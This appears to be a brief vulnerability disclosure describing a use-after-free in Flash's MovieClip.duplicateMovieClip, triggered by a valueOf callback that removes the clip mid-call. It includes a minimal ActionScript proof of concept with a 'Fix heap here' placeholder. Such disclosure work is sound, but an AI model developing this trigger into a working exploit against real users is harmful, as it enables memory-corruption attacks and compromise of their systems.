There is a use-after-free in MovieClip.duplicateMovieClip. If the depth or movie name parameter provided is an object with toString or valueOf defined, this method can free the MovieClip, which is then used.

A minimal PoC follows:


this.createEmptyMovieClip("mc", 1);

mc.duplicateMovieClip( "mc",{valueOf : func});


function func(){

	trace("in func");
	mc.removeMovieClip();

        // Fix heap here

	return 5;

	}


A sample swf and fla are attached.
